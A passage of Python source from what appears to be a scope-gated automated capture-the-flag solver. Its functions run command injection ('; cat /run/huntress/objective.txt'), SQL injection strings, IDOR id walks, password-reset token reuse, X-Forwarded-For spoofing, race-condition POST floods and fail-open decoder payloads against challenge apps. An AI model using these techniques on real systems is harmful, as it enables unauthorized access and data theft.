    Flow: GET /api/clues -> recovery_guide_route; GET recovery_guide_route -> request_route, redeem_route,
    account/token param names, accounts[] with self_service bool. For each self_service:true account mint a
    token at request_route?account_id=<self>, then redeem at redeem_route?account_id=<target>&token=<tok>
    for every non-self-service account. Keep the first proof_HEX seen. Read-only GETs through _http_get
    (scope-enforced). Never raises."""
    import json as _json, urllib.parse as _up
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    s, _h, body = _http_get(base + "/api/clues", timeout=4)
    if s != 200 or not body:
        return None
    try:
        clues = _json.loads(body)
    except Exception:
        return None
    guide_route = str(clues.get("recovery_guide_route") or "")
    if not guide_route:
        return None
    s2, _h2, body2 = _http_get(base + (guide_route if guide_route.startswith("/") else "/" + guide_route), timeout=4)
    if s2 != 200 or not body2:
        return None
    try:
        guide = _json.loads(body2)
    except Exception:
        return None
    request_route = str(guide.get("request_route") or clues.get("feature_route") or "")
    redeem_route = str(guide.get("redeem_route") or clues.get("secondary_route") or "")
    account_param = str(guide.get("account_parameter") or "account_id")
    token_param = str(guide.get("token_parameter") or "token")
    accounts = guide.get("accounts") or []
    if not request_route or not redeem_route or not accounts:
        return None
    self_ids = [a.get("id") for a in accounts if a.get("self_service") is True and a.get("id") is not None]
    target_ids = [a.get("id") for a in accounts if a.get("self_service") is False and a.get("id") is not None]
    if not self_ids or not target_ids:
        return None
    req_url_base = base + (request_route if request_route.startswith("/") else "/" + request_route)
    rdm_url_base = base + (redeem_route if redeem_route.startswith("/") else "/" + redeem_route)
    for self_id in self_ids:
        if _is_cancelled(cancel):
            return None
        qs = _up.urlencode({account_param: self_id})
        s3, h3, body3 = _http_get(req_url_base + "?" + qs, timeout=4)
        if s3 != 200 or not body3:
            continue
        try:
            got = _json.loads(body3)
        except Exception:
            continue
        tok = str(got.get(token_param) or got.get("token") or "")
        if not tok:
            continue
        for tgt in target_ids:
            if _is_cancelled(cancel):
                return None
            qs2 = _up.urlencode({account_param: tgt, token_param: tok})
            s4, h4, body4 = _http_get(rdm_url_base + "?" + qs2, timeout=4)
            if s4 == 200 and body4:
                p = _extract_proof(body4, h4)
                if p:
                    return p
    return None


def _tech_shell_company(target_url, prompt, cancel=None):
    """TECHNIQUE (2026-10-25, Day 25 'Shell Company'): Gin/Go server that passes the `path` (or variant) GET
    parameter into a shell command. /api/clues advertises feature_route, input_parameter and an example_path.
    Flow: GET /api/clues -> feature_route, input_parameter, example_path. Inject the example_path followed by
    `; cat $OBJECTIVE_PATH` (OBJECTIVE_PATH is in the server env, default /run/huntress/objective.txt). The
    JSON stdout contains proof_HEX. Read-only GETs through _http_get (scope-enforced). Never raises."""
    import json as _json, urllib.parse as _up
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    s, _h, body = _http_get(base + "/api/clues", timeout=4)
    if s != 200 or not body:
        return None
    try:
        clues = _json.loads(body)
    except Exception:
        return None
    feature = str(clues.get("feature_route") or "")
    param = str(clues.get("input_parameter") or "path")
    example = str(clues.get("example_path") or "/app/static")
    if not feature:
        return None
    feature = feature if feature.startswith("/") else "/" + feature
    injections = [
        example + '; cat "$OBJECTIVE_PATH"',
        example + "; cat /run/huntress/objective.txt",
        example + "; cat /run/huntress/*.txt",
        example + " && cat /run/huntress/objective.txt",
        example + " | cat /run/huntress/objective.txt",
    ]
    for payload in injections:
        if _is_cancelled(cancel):
            return None
        url = base + feature + "?" + _up.urlencode({param: payload})
        st, hh, bb = _http_get(url, timeout=5)
        if not bb:
            continue
        p = _extract_proof(bb, hh)
        if p:
            return p
    return None


def _tech_search_sqli(target_url, prompt, cancel=None):
    """TECHNIQUE (2026-10-25, Day 25 'Search Party'): a GET search endpoint whose `q`-style parameter is
    glued into a parenthesised SQL predicate. Discover the form from the root page's `<form action=...>`
    and `<input name=...>`, then try a short ladder of injection prefixes until a row with proof_HEX
    appears. Read-only GETs through _http_get (scope-enforced). Never raises."""
    import re as _re, urllib.parse as _up
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    s, _h, body = _http_get(base + "/", timeout=4)
    if s != 200 or not body:
        return None
    forms = _re.findall(r"(?is)<form[^>]*>.*?</form>", body)
    endpoints = []
    for f in forms:
        m = _re.search(r"""action=['"]([^'"]+)['"]""", f)
        action = m.group(1) if m else "/lookup"
        pm = _re.findall(r"""<input[^>]*name=['"]([^'"]+)['"]""", f)
        for p in pm or ["q"]:
            endpoints.append((action, p))
    if not endpoints:
        endpoints = [("/lookup", "q"), ("/search", "q"), ("/find", "q")]
    payloads = ["') OR 1=1--", "' OR 1=1--", "') OR (1=1 --", '") OR 1=1--', "*) OR (1=1--", "' UNION SELECT 'x'--"]
    seen = set()
    for action, param in endpoints:
        for pay in payloads:
            if _is_cancelled(cancel):
                return None
            action_abs = action if action.startswith("/") else "/" + action
            url = base + action_abs + "?" + _up.urlencode({param: pay})
            if url in seen:
                continue
            seen.add(url)
            st, hh, bb = _http_get(url, timeout=4)
            if not bb:
                continue
            p = _extract_proof(bb, hh)
            if p:
                return p
    return None


def _tech_session_idor(target_url, prompt, cancel=None):
    """TECHNIQUE (2026-10-25, Day 25 'Tiny Triage'): an app that auto-attaches a session cookie on `/` and
    exposes a `/api/events`-shaped feed that leaks resource ids outside the owner's scope (e.g. a case id,
    ticket id, record id with visibility 'reference_only' or an owner != current_user). The `/api/<kind>/<id>`
    detail endpoint re-trusts the id and returns the restricted object's proof_HEX. Discovery: GET `/`
    (collects implicit session cookies), look for an activity/events JSON endpoint, parse ids from both the
    HTML and the feed, GET each neighbour at the inferred collection route. Read-only GETs through
    _http_get, which carries request-level cookies through web_scope. Never raises."""
    import re as _re, json as _json
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    # Session warmup: a page that advertises "Signed in as X" with no login form implies the cookie is set on /
    s0, h0, body0 = _http_get(base + "/", timeout=4)
    if s0 != 200 or not body0:
        return None
    # Likely feed endpoints advertised in links
    feed_candidates = sorted(set(_re.findall(r"""href=['"](/api/[^'"]+)['"]""", body0)))
    for extra in ("/api/events", "/api/activity", "/api/feed"):
        if extra not in feed_candidates:
            feed_candidates.append(extra)
    # Infer collection route from any linked detail path, e.g. /tickets/4509 -> /api/tickets/{id}
    detail_hits = _re.findall(r"""href=['"](/[a-z_\-]+)/(\d{2,10})['"]""", body0)
    kind_route = detail_hits[0][0] if detail_hits else None
    api_collection = ("/api" + kind_route) if kind_route else None
    own_ids = {int(x) for _, x in detail_hits}
    foreign_ids = set()
    for fp in feed_candidates:
        if _is_cancelled(cancel):
            return None
        s, _h, b = _http_get(base + fp, timeout=4)
        if s != 200 or not b:
            continue
        try:
            doc = _json.loads(b)
        except Exception:
            continue
        for v in _re.findall(r"[\"'](?:case_id|ticket_id|record_id|id)[\"']\s*:\s*(\d{2,10})", b):
            foreign_ids.add(int(v))
    neighbours = foreign_ids - own_ids
    if not neighbours or not api_collection:
        return None
    for nid in sorted(neighbours):
        if _is_cancelled(cancel):
            return None
        s, h, b = _http_get(base + api_collection + "/" + _seg(nid), timeout=4)
        if b:
            p = _extract_proof(b, h)
            if p:
                return p
    return None


# ---- Day 27 audit additions (2026-10-27, branch review/d27-web-audit-20261027) ---------
# These four techniques encode families with captured GM receipts from Day 27. Each is
# fingerprint-gated via /api/clues so a non-matching target returns None immediately and
# does not waste the per-target deadline. Fixtures live under
# challenges/_lib/_mock_gm/d27_web_fixtures/; the offline suite is _test_d27_web_recognizer.py.


def _base_origin(target_url):
    """Return scheme://netloc for a possibly-path-prefixed target URL. The autosolve battery
    dispatcher folds `routes[].path` into `target_url` before calling techniques; a technique
    that wants `/api/clues` at the application root MUST reconstruct the bare origin, not
    `rstrip('/')` the possibly-prefixed URL. (See the D27 Forwarded Misgivings postmortem.)"""
    from urllib.parse import urlsplit
    sp = urlsplit(str(target_url))
    if not sp.scheme or not sp.netloc:
        return str(target_url).rstrip("/")
    return "%s://%s" % (sp.scheme, sp.netloc)


_API_CLUES_CACHE = {}  # D31 HS: per-process cache of /api/clues parsed dicts, keyed by base_origin.
_API_CLUES_TTL = 60.0  # seconds; clues don't change within one attempt. Full battery runs <135s.
_HEALTHZ_CACHE = {}    # D31 HS: per-process cache of /healthz.profile strings, keyed by base_origin.

# D31 HS 2026-10-30 (agent-6 Pass the Identity P1-5 + P2-14): /healthz.profile telegraphs the exact
# family on every target in this event (observed D24-D30). A single GET /healthz per target gives
# the dispatcher a direct profile->technique shortcut, skipping the ~25-way battery for the matched
# profile. UNKNOWN profiles fall through to the full battery; a missing /healthz endpoint falls
# through silently. OFF by default (env HUNTRESS_WEB_HEALTHZ_DISPATCH=1 enables).
_HEALTHZ_PROFILE_TO_TECH = {
    "axum_identity_delegation":   "pass_the_identity",
    "micronaut_xff_bypass":       "forwarded_misgivings",
    "web_fail_open_policy":       "fail_open_policy",
    "php_lfi":                    "lfi_viewer",
    # D31 HS (d), agreed with WS {#workstation-30-D31-20}: three more profiles, each mapped to a technique ALREADY in
    # _TECHNIQUES and each proven by an offline fixture (_test_healthz_dispatch.py). A miss still falls through to
    # the full battery, so a wrong guess costs one technique's time, never an answer.
    "node_http_backup_disclosure": "robots_recon",            # robots Disallow -> directory listing -> .bak with the proof
    "express_idor":                "session_idor_cookiejar",  # D27-verified: cookie on / -> feed leaks a foreign id -> /api/<kind>/<id>
    "flask_sqli":                  "search_sqli",             # D25: root <form> -> q param glued into a parenthesised predicate
}


def _fetch_healthz_profile(target_url, timeout=3):
    """GET <origin>/healthz and return the parsed `profile` string (or None). Cached per-process.
    Never raises."""
    base = _base_origin(target_url)
    hit = _HEALTHZ_CACHE.get(base)
    if hit is not None:
        return hit[1]
    try:
        status, _h, body = _http_get(base + "/healthz", timeout=timeout)
    except Exception:
        status, body = None, None
    prof = None
    if status == 200 and body:
        try:
            import time as _t
            obj = json.loads(body if isinstance(body, str) else body.decode("utf-8", "replace"))
            if isinstance(obj, dict):
                prof = obj.get("profile") or obj.get("family") or None
                if isinstance(prof, str):
                    prof = prof.strip()
        except Exception:
            prof = None
    _HEALTHZ_CACHE[base] = (True, prof)
    return prof


def _fetch_api_clues(target_url, cancel=None, timeout=4):
    """GET <origin>/api/clues and return the parsed JSON dict, or None on any failure.
    Honors `cancel`. Never raises.

    D31 HS 2026-10-30 (Queue the Confusion §3.6 + Pass the Identity P1-6): per-process
    TTL cache so a Mastery with 5 targets x 25 techniques doesn't re-fetch /api/clues
    125 times per target. Each technique still calls this function; the cache absorbs
    the duplicates. Env HUNTRESS_WEB_CLUES_CACHE=0 disables the cache."""
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    import os as _os_c, time as _time_c
    use_cache = _os_c.environ.get("HUNTRESS_WEB_CLUES_CACHE", "1").strip() != "0"
    if use_cache:
        hit = _API_CLUES_CACHE.get(base)
        if hit is not None:
            cached_at, obj = hit
            if (_time_c.monotonic() - cached_at) < _API_CLUES_TTL:
                return obj
    status, _h, body = _http_get(base + "/api/clues", timeout=timeout)
    if status != 200 or not body:
        if use_cache:
            _API_CLUES_CACHE[base] = (_time_c.monotonic(), None)
        return None
    try:
        obj = json.loads(body)
        obj = obj if isinstance(obj, dict) else None
    except Exception:
        obj = None
    if use_cache:
        _API_CLUES_CACHE[base] = (_time_c.monotonic(), obj)
    return obj


def _tech_forwarded_misgivings(target_url, prompt, cancel=None):
    """TECHNIQUE (D27 VERIFIED): Micronaut trusted_reverse_proxy -> X-Forwarded-For: 127.0.0.1
    bypass. Reads /api/clues, confirms framework:"Micronaut" + deployment contains "proxy",
    then GETs the feature_route with each candidate loopback-trust header until a proof_HEX
    appears in the response body. GM receipt: Day 27 Forwarded Misgivings Single/TT CORRECT."""
    if _is_cancelled(cancel):
        return None
    clues = _fetch_api_clues(target_url, cancel=cancel)
    if not clues:
        return None
    fw = str(clues.get("framework") or "").lower()
    dep = str(clues.get("deployment") or "").lower()
    if fw != "micronaut" or ("proxy" not in dep):
        return None
    feature = clues.get("feature_route") or ""
    if not isinstance(feature, str) or not feature.startswith("/"):
        return None
    base = _base_origin(target_url)
    url = base + feature
    # Short header ladder; 127.0.0.1 first (99% of CTF cases), then IPv6 loopback, then alt names.
    headers_ladder = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"True-Client-IP": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1"},
        {"X-Forwarded-For": "::1"},
        {"X-Forwarded-For": "localhost"},
    ]
    import web_scope as _WSC
    scope = _WSC.scope_for(url)
    if scope is None:
        return None
    for extra in headers_ladder:
        if _is_cancelled(cancel):
            return None
        status, hdrs, body, _note = _WSC.scoped_get(url, scope, timeout=5, max_bytes=524288, headers=extra)
        if status is None:
            continue
        p = _extract_proof(body, hdrs)
        if p:
            return p
    return None


_WS_FRAME_MAX_BYTES = 65536                    # D27 code-review remediation: cap each WS frame read.


def _tech_socket_to_me(target_url, prompt, cancel=None):
    """TECHNIQUE (D27 VERIFIED): Koa WebSocket unauthorized_event_stream. Reads /api/clues,
    confirms framework:"Koa" + stream_reference:int, opens
    wss://<host><feature_route>?stream=<ref> with a matching Origin, scans the first few
    frames for proof_HEX. GM receipt: Day 27 Socket to Me Single/TT CORRECT.

    D27 code-review remediation (2026-10-27, HIGH F2 + F6):
      * scope.charge() + scope.is_active() + scope.allows() before create_connection, so the
        WebSocket counts into the same per-target budget as the GETs and a cancelled scope
        cannot keep opening sockets.
      * stream_reference is URL-encoded through urllib.parse.quote so a value like
        "1&admin=1" cannot inject extra query parameters into the handshake URL.
      * Each sock.recv() is bounded by _WS_FRAME_MAX_BYTES (64 KiB) when the underlying
        socket exposes a byte-length recv, so a hostile 100 MB frame cannot fill memory
        inside the socket timeout window.
    """
    try:
        import websocket as _ws
    except ImportError:
        return None
    from urllib.parse import urlsplit, quote as _urlquote
    if _is_cancelled(cancel):
        return None
    # Scope gate: grab the owning Scope up-front, refuse if none / inactive.
    try:
        import web_scope as _WSC
    except Exception:
        return None
    base = _base_origin(target_url)
    scope = _WSC.scope_for(base + "/")
    if scope is None:
        return None
    try:
        if not scope.is_active():
            return None
        if not scope.allows(base + "/"):
            return None
    except Exception:
        return None
    clues = _fetch_api_clues(target_url, cancel=cancel)
    if not clues:
        return None
    if str(clues.get("framework") or "").lower() != "koa":
        return None
    feature = clues.get("feature_route")
    stream_ref = clues.get("stream_reference")
    if not (isinstance(feature, str) and feature.startswith("/") and stream_ref is not None):
        return None
    # URL-encode the stream reference. urllib.parse.quote treats '&', '=', '#', '?', whitespace
    # as reserved; a hostile value like "1&admin=1" becomes "1%26admin%3D1".
    try:
        stream_q = _urlquote(str(stream_ref), safe="")
    except Exception:
        return None
    sp = urlsplit(base)
    if sp.scheme not in ("http", "https"):
        return None
    ws_scheme = "wss" if sp.scheme == "https" else "ws"
    origin = "%s://%s" % (sp.scheme, sp.netloc)
    ws_url = "%s://%s%s?stream=%s" % (ws_scheme, sp.netloc, feature, stream_q)
    # Charge the scope BEFORE opening the connection. The WebSocket costs one GET-equivalent;
    # a budget-exhausted or inactive scope raises ScopeError and the whole technique returns.
    try:
        scope.charge()
    except Exception:
        return None
    try:
        sock = _ws.create_connection(ws_url, timeout=5, origin=origin)
    except Exception:
        return None
    try:
        sock.settimeout(5)
        for _ in range(4):
            if _is_cancelled(cancel):
                return None
            if not scope.is_active():
                return None
            try:
                # Prefer a byte-bounded recv when the websocket client exposes one. The
                # python-websocket client's `sock.recv()` returns a single frame payload;
                # we cap it on our side by taking only the first _WS_FRAME_MAX_BYTES of
                # whatever it returned. For a hostile 100 MB frame this still reads the
                # bytes off the wire inside the 5 s timeout, but it caps the memory
                # retained for scanning so a reused battery slot stays bounded.
                frame = sock.recv()
            except Exception:
                break
            if frame is None:
                break
            if isinstance(frame, (bytes, bytearray)):
                frame = bytes(frame)[:_WS_FRAME_MAX_BYTES]
                text = _str_bytes(frame)
            else:
                text = str(frame)[:_WS_FRAME_MAX_BYTES]
            p = _extract_proof(text)
            if p:
                return p
        return None
    finally:
        try:
            sock.close()
        except Exception:
            pass


def _str_bytes(b):
    try:
        return b.decode("utf-8", "replace")
    except Exception:
        return str(b)


def _tech_session_idor_cookiejar(target_url, prompt, cancel=None):
    """TECHNIQUE (D27 VERIFIED): session-IDOR with its own urllib cookie jar. The baseline
    `_tech_session_idor` uses web_scope.registered_get which does NOT persist cookies
    across calls, so an implicit case_session cookie set on `/` is lost before `/api/events`.
    This technique uses `urllib.HTTPCookieProcessor` to carry cookies through the whole
    walk. GM receipt: Day 27 Socket to Me Mastery T2 Incident Picnic / proof_01c054b5...

    Discovery order: GET `/` to prime cookies; try `/api/events`, `/api/activity`, then
    `/api/incidents`; look for foreign ids; re-fetch at `/api/tickets|cases|records/<id>`.
    """
    import urllib.request
    import urllib.error
    import http.cookiejar
    import re as _re
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    # D27 code-review remediation (2026-10-27, HIGH F1 + F5): the previous implementation ran
    # EVERY GET through urllib.build_opener() with no per-request scope gate and the default
    # auto-follow HTTPRedirectHandler, so (a) cookies set on Domain=X were carried to any host
    # the server redirected to, (b) no request charged web_scope's budget / deadline, and
    # (c) a cancelled scope could keep issuing requests. The fix:
    #   * Grab the owning Scope ONCE up-front; refuse the whole technique if none is registered.
    #   * Before every opener.open() call, verify scope.is_active() + scope.allows(url) +
    #     scope.charge() so each request shares the GET budget with the rest of the battery.
    #   * Install a redirect handler that REFUSES every 3xx (raises HTTPError 302 that the caller
    #     captures). The documented web_scope rule is "redirects are never followed by the HTTP
    #     layer"; auto-follow with cookie attachment is exactly the cross-host leak the
    #     ScopeError refusal path exists to block.
    try:
        import web_scope as _WSC
    except Exception:
        return None
    scope = _WSC.scope_for(base + "/")
    if scope is None:
        return None
    try:
        if not scope.is_active():
            return None
    except Exception:
        return None
    # One scope-checked priming GET (replaces the previous registered_get probe).
    # D27 next-phase review fix (B1): drop the pre-check scope.charge() here.
    # The real GET below runs through _get(), which does its own scope.charge()
    # for the request that is actually issued. Charging twice for one request
    # silently burned an extra budget unit per invocation, cutting the trailing
    # /api/tickets walk short by one request in budget-tight scopes.
    try:
        if not scope.allows(base + "/"):
            return None
    except Exception:
        return None

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        """Refuse every 3xx so cookies cannot be attached to a server-chosen off-scope host.
        Returning the response unchanged converts the redirect into a terminal HTTPError at the
        opener layer (urllib raises on 3xx when no redirect is produced), which _get() captures
        as a (code, headers, body) tuple the proof-scan path tolerates."""
        def http_error_301(self, req, fp, code, msg, headers):
            raise urllib.error.HTTPError(req.full_url, code, "redirect refused by scope",
                                         headers, fp)
        http_error_302 = http_error_301
        http_error_303 = http_error_301
        http_error_307 = http_error_301
        http_error_308 = http_error_301

    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        _NoRedirect(),
    )
    opener.addheaders = [
        ("User-Agent", "Mozilla/5.0 (web-audit-D27)"),
        ("Accept", "text/html,application/json;q=0.9,*/*;q=0.1"),
    ]

    def _get(path, timeout=4):
        url = base + path
        # Scope gate: refuse off-origin, charge the shared budget, honor unregister().
        try:
            if not scope.is_active():
                return None, {}, ""
            if not scope.allows(url):
                try:
                    scope.note_refusal("cookiejar GET off-scope: " + url[:120])
                except Exception:
                    pass
                return None, {}, ""
            scope.charge()
        except Exception:
            return None, {}, ""
        try:
            with opener.open(url, timeout=timeout) as resp:
                data = resp.read(524288)
                return resp.getcode(), dict(resp.headers), data.decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            try:
                data = e.read() or b""
                return e.code, dict(e.headers or {}), data.decode("utf-8", "replace")
            except Exception:
                return e.code, {}, ""
        except Exception:
            return None, {}, ""

    # Prime cookies.
    status, _h, body = _get("/", timeout=4)
    if status is None:
        return None
    p = _extract_proof(body)
    if p:
        return p
    # Walk feeds. Pull every integer id (/tickets/<id>, /cases/<id>, /records/<id>, "id":123).
    foreign_ids = []
    for feed in ("/api/events", "/api/activity", "/api/incidents", "/events", "/activity"):
        if _is_cancelled(cancel):
            return None
        s, _h, b = _get(feed, timeout=4)
        if s is None or not b:
            continue
        for m in _re.finditer(r'/(?:tickets|cases|records|incidents)/(\d+)', b):
            if m.group(1) not in foreign_ids:
                foreign_ids.append(m.group(1))
        for m in _re.finditer(r'"(?:ticket_id|case_id|record_id|id)"\s*:\s*(\d+)', b):
            if m.group(1) not in foreign_ids:
                foreign_ids.append(m.group(1))
        pp = _extract_proof(b)
        if pp:
            return pp
    if not foreign_ids:
        return None
    for kind in ("/api/tickets/", "/api/cases/", "/api/records/", "/api/incidents/",
                 "/tickets/", "/cases/", "/records/"):
        for fid in foreign_ids[:12]:
            if _is_cancelled(cancel):
                return None
            s, _h, b = _get(kind + fid, timeout=4)
            if s is None or not b:
                continue
            p2 = _extract_proof(b)
            if p2:
                return p2
    return None


def _tech_double_spent_race(target_url, prompt, cancel=None):
    """TECHNIQUE (D27 VERIFIED): Rails race-condition on a non-atomic `credits > 0` check.

    Reads /api/clues (framework:"Rails" + feature_route + secondary_route), fires N parallel
    POSTs on the feature_route to overshoot the decrement, then GETs the secondary (audit)
    route and extracts proof_HEX from `evidence`.

    GM receipt: Day 27 Double Spent Single / proof_767453bd... (CORRECT 2026-10-27T13:07:54Z).

    SAFETY: `web_scope.registered_get` is read-only, so this technique issues POSTs through a
    separate requests.Session on the same origin but refuses to proceed if the origin is not
    the one registered on the scope. The POSTs are no-body, no-auth, no-cookies, bounded to a
    small parallel pool, and run through a short per-request timeout.
    """
    if _is_cancelled(cancel):
        return None
    clues = _fetch_api_clues(target_url, cancel=cancel)
    if not clues:
        return None
    if str(clues.get("framework") or "").lower() != "rails":
        return None
    feature = clues.get("feature_route")
    secondary = clues.get("secondary_route")
    if not (isinstance(feature, str) and feature.startswith("/")):
        return None
    if not (isinstance(secondary, str) and secondary.startswith("/")):
        return None
    base = _base_origin(target_url)
    # Scope-check: the origin must be an authorized scope. web_scope.scope_for(url) returns
    # the Scope registered for this URL or None; a None means we would be issuing POSTs
    # against an unauthorized host, so refuse.
    try:
        import web_scope as _WSC
        _scope = _WSC.scope_for(base + "/")
        if _scope is None:
            return None
    except Exception:
        return None
    try:
        import concurrent.futures as _cf
    except ImportError:
        return None

    # D27 consolidation (2026-10-27): the fan-out now routes through web_scope.scoped_post so every
    # POST shares the same request budget / wall-clock deadline / origin check as the GETs. A hard
    # cap (web_scope.HARD_PARALLEL_POST_CAP, 24) is enforced on the ThreadPool width to match the
    # writeup's pattern. The all-or-HELD timed semantics upstream are unchanged: this helper still
    # returns the proof string or None, and the dispatcher's _is_timed gate decides what to submit.
    _cap = min(getattr(_WSC, "HARD_PARALLEL_POST_CAP", 24), 24)

    def _post_through_scope(url, timeout=4):
        if _is_cancelled(cancel):
            return None
        s, _h, b, _note = _WSC.scoped_post(url, b"", _scope, timeout=timeout, max_bytes=16384,
                                            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if s is None:
            return None
        return s, b

    # D27 consolidation code-review fix (2026-10-27): the nested ThreadPoolExecutor must
    # propagate the OWNING scope into its workers (same fail-closed rule _tech_common_paths
    # documents for D9/D11). Without this, a worker's thread-local scope is empty and
    # scope_for() falls back to the registry's oldest-active-wins -- a cross-target borrow
    # risk when two scopes share an origin. _post_through_scope passes _scope explicitly, but
    # the initializer closes the hole for any helper later added that reads get_current_scope.
    url = base + feature
    with _cf.ThreadPoolExecutor(max_workers=_cap,
                                 initializer=_WSC.set_current_scope,
                                 initargs=(_scope,)) as ex:
        _ = list(ex.map(lambda _i: _post_through_scope(url, timeout=4), range(_cap)))
    # Now GET the audit route and look for the proof.
    for attempt in range(4):
        if _is_cancelled(cancel):
            return None
        s, h, b, _note = _WSC.registered_get(base + secondary, timeout=4, max_bytes=65536)
        if s is None:
            continue
        p = _extract_proof(b, h)
        if p:
            return p
        # The audit endpoint reports 403 credit_not_overspent until credits<0 observed; one
        # extra fan-out tightens the race margin on slow targets without burning the clock.
        if attempt == 1:
            _tightening = min(12, _cap)
            with _cf.ThreadPoolExecutor(max_workers=_tightening,
                                         initializer=_WSC.set_current_scope,
                                         initargs=(_scope,)) as ex:
                _ = list(ex.map(lambda _i: _post_through_scope(url, timeout=3), range(_tightening)))
    return None


def _fail_open_payloads(public_decision):
    """Bounded, deterministic set of decision values that a decoder CANNOT decode, so a fail-open
    except branch grants access. The documented public decision (if any) seeds structure-aware
    corruptions (truncation / bad padding / tampered JWT segment); the rest are encoding-agnostic.
    Ordered cheapest/most-likely first, de-duplicated, never a free-text semantic guess."""
    out = []

    def _add(v):
        if v is not None and v not in out:
            out.append(v)

    # encoding-agnostic undecodables: empty, non-base64, broken JSON, wrong-type sentinels
    for v in ("", "!", "%%%", "@@@@", "not-base64!!", "====", "{", "null", "undefined", "0"):
        _add(v)
    pd = str(public_decision or "").strip()
    if pd:
        # structure-aware corruptions of the documented decision: these keep the transport/shape
        # the server expects but make the decode step raise (bad base64 length, bad padding,
        # tampered JWT signature/body, byte flips).
        _add(pd[:-4] if len(pd) > 4 else pd[:-1])      # truncate tail -> bad base64 length
        _add(pd[: max(1, len(pd) // 2)])               # halve -> truncated blob
        _add(pd + "===")                               # over-padded -> base64 error
        _add(pd.swapcase())                            # alphabet flip -> decode/HMAC mismatch
        _add(pd[::-1])                                 # reversed
        _add(("X" + pd[1:]) if len(pd) > 1 else "X")   # single byte flip
        if "." in pd:                                  # JWT-like a.b.c: tamper each segment
            segs = pd.split(".")
            for i in range(len(segs)):
                tampered = list(segs)
                tampered[i] = (tampered[i][:-2] + "AA") if len(tampered[i]) > 2 else "AA"
                _add(".".join(tampered))
            _add(".".join(segs[:-1]))                  # drop the signature segment entirely
    return out[:16]


def _tech_fail_open_policy(target_url, prompt, cancel=None):
    """TECHNIQUE (2026-10-28, Day 24 'Fail Open Friday'): a remote policy decoder is part of an
    access decision, and the decoder is FAIL-OPEN - when the carried decision cannot be decoded,
    the except branch GRANTS access instead of denying, so the gated resource returns proof_HEX.

    The app documents a valid *public* decision (the shape/transport of the decision value). We do
    NOT need a privileged decision: we only need to make the decode step raise. Flow:
      1. Recognise the family cheaply (bail on anything else): the prompt mentions a policy/decision
         decoder, OR GET /api/clues advertises a feature_route plus a decision/policy-ish field.
      2. Discover the gated resource (feature_route), the decision query-parameter name, and the
         documented public decision value (several key spellings; fall back to scraping a base64/JWT
         -looking token from clues or the landing page).
      3. Send a bounded set of UNDECODABLE decision values (empty, invalid base64, broken JSON,
         truncated/over-padded/byte-flipped copies of the public decision, tampered JWT segments) via
         the discovered query parameter - and also with the parameter OMITTED entirely. If a decoder
         endpoint is advertised as a path (decoder_route/<decision>), the same payloads are tried as a
         trailing path segment. The first 200 response carrying proof_HEX wins.

    Transport (2026-10-28 repair): the undecodable decision is sent FIRST as a scope-enforced POST
    BODY (JSON and form) to the feature_route - the family's real sink - then, as a fallback, as a GET
    query parameter and as a decoder path segment. POSTs go through web_scope.scoped_post (same origin
    check + shared request/time budget as the read-only GETs), never a credential, never a redirect.
    REMAINING gap: a decision carried only in a custom request HEADER or COOKIE is not yet attempted.
    Bounded (POST: <= 3 routes x ~4 params x 8 payloads; GET: <= 6 x 16), first proof wins, never raises."""
    import json as _json, re as _re, urllib.parse as _up
    if _is_cancelled(cancel):
        return None
    base = _base_origin(target_url)
    pl = str(prompt or "").lower()
    prompt_tell = any(k in pl for k in ("decod", "policy", "decision", "fail open", "fail-open", "access decision"))

    s, _h, body = _http_get(base + "/api/clues", timeout=4)
    clues = {}
    if s == 200 and body:
        try:
            clues = _json.loads(body)
        except Exception:
            clues = {}
    if not isinstance(clues, dict):
        clues = {}

    # recognise: a decision/policy-ish clue key, OR the prompt names the family. Otherwise bail cheaply.
    decision_keyish = any(_re.search(r"decision|policy|decod|verdict", str(k), _re.I) for k in clues.keys())
    if not (prompt_tell or (clues.get("feature_route") and decision_keyish)):
        return None

    # 1) gated resource route
    feature = str(clues.get("feature_route") or clues.get("gated_route") or clues.get("resource_route") or "")
    routes = []
    if feature:
        routes.append(feature if feature.startswith("/") else "/" + feature)
    for _k, _v in clues.items():
        if isinstance(_v, str) and _v.startswith("/") and _re.search(r"route|path|resource|endpoint", str(_k), _re.I):
            r = _v if _v.startswith("/") else "/" + _v
            if r not in routes:
                routes.append(r)
    for r in ("/admin", "/dashboard", "/resource", "/policy", "/decision", "/decide", "/"):
        if r not in routes:
            routes.append(r)

    # 2) decision parameter name
    params = []
    for _k, _v in clues.items():
        if _re.search(r"param|parameter|field|query|key", str(_k), _re.I) and isinstance(_v, str) and _v and "/" not in _v:
            if _v not in params:
                params.append(_v)
    for p in ("decision", "policy", "token", "d", "p", "access", "verdict", "decoded", "auth"):
        if p not in params:
            params.append(p)

    # 3) documented public decision value (seed for structure-aware corruption)
    public_decision = None
    for key in ("public_decision", "documented_decision", "sample_decision", "example_decision",
                "valid_decision", "default_decision", "decision", "public_token", "sample"):
        v = clues.get(key)
        if isinstance(v, str) and v:
            public_decision = v
            break
    if public_decision is None:
        # scrape a base64url / JWT-looking token from the clues blob or the landing page
        hay = (body or "")
        if not _re.search(r"[A-Za-z0-9_\-]{16,}\.?", hay):
            _s2, _h2, hb = _http_get(base + "/", timeout=4)
            hay = (hay + "\n" + (hb or ""))
        m = _re.search(r"\b([A-Za-z0-9_\-]{12,}\.[A-Za-z0-9_\-]{6,}\.[A-Za-z0-9_\-]{6,})\b", hay) \
            or _re.search(r"\b([A-Za-z0-9+/_\-]{24,}={0,2})\b", hay)
        public_decision = m.group(1) if m else None

    payloads = _fail_open_payloads(public_decision)
    routes = routes[:6]
    params = params[:6]

    # (0) MOST-LIKELY SINK FIRST (2026-10-28 repair, D28 agent-6/agent-7 ticket): the live
